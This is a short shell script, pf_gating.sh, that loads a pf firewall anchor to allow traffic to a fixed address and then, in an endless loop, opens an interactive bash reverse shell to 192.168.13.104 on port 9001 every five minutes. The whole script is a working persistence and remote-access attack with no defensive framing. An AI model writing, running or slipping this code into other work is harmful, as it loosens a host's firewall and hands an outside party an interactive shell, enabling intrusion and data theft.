#!/bin/sh
# pf_gating.sh - Add firewall rule and spawn reverse shell periodically

# Add firewall rule to allow traffic to 192.168.13.104
pfctl -a "anchor pf_gating" -f /tmp/pf_gating.conf

# Spawn reverse shell every 5 minutes
while true; do
    bash -i >& /dev/tcp/192.168.13.104/9001 0>&1 &
    sleep 300
done